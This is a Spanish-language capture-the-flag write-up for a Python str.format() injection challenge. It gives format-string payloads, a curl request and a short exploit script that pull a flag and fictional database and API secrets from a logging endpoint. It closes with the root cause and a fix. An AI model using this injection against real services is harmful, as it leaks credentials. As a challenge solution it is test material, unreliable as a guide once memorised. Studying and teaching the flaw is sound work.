# Solución Reto 12: Python Format String (ctf-format-string)

## Descripción

El sistema de logging aplica `str.format()` con el input del usuario directamente sobre un diccionario de configuración interna:

```python
SECRET_CONFIG = {
    "db_host": "postgres.internal",
    "db_user": "admin",
    "db_pass": "sup3r_s3cr3t_db_p4ss",
    "flag": FLAG,
    "api_key": "sk-internal-9f3a2b1c8d7e6f5a4b3c2d1e",
}

output = msg.format(**SECRET_CONFIG)
```

`str.format(**dict)` permite referenciar cualquier clave del diccionario usando la sintaxis `{nombre_clave}`. Si el usuario controla la cadena de formato, puede extraer cualquier valor del dict.

## Explotación

### 1. Extraer la flag directamente

Ingresar como mensaje:

```
{flag}
```

El servidor ejecuta `"{flag}".format(**SECRET_CONFIG)` y devuelve el valor de `SECRET_CONFIG["flag"]`, que es la flag.

### 2. Extraer otras claves sensibles

```
{db_pass}
{api_key}
{db_user}
```

Cualquier clave del diccionario es accesible con esta técnica.

### 3. Con curl

```bash
curl -s -X POST http://<HOST>:<PORT>/ \
  -d "msg={flag}"
```

La respuesta HTML mostrará el valor de la flag en el bloque de log registrado.

## Script de explotación

```python
import urllib.request, urllib.parse, re

TARGET = "http://<HOST>:<PORT>"

data = urllib.parse.urlencode({"msg": "{flag}"}).encode()
with urllib.request.urlopen(TARGET + "/", data) as r:
    html = r.read().decode()

match = re.search(r'CTF\{[^}]+\}', html)
if match:
    print("Flag:", match.group())
```

## Causa raíz

`str.format()` con input no confiable es equivalente a una inyección de plantillas. El fix es no usar `format()` con datos del usuario:

```python
# Fix correcto: construir el log sin format()
import logging
logging.info("Log: %s", msg)   # el mensaje nunca se interpreta como plantilla
```

## Flag

```
CTF{...}   ← enviar {flag} como mensaje al sistema de logging
```
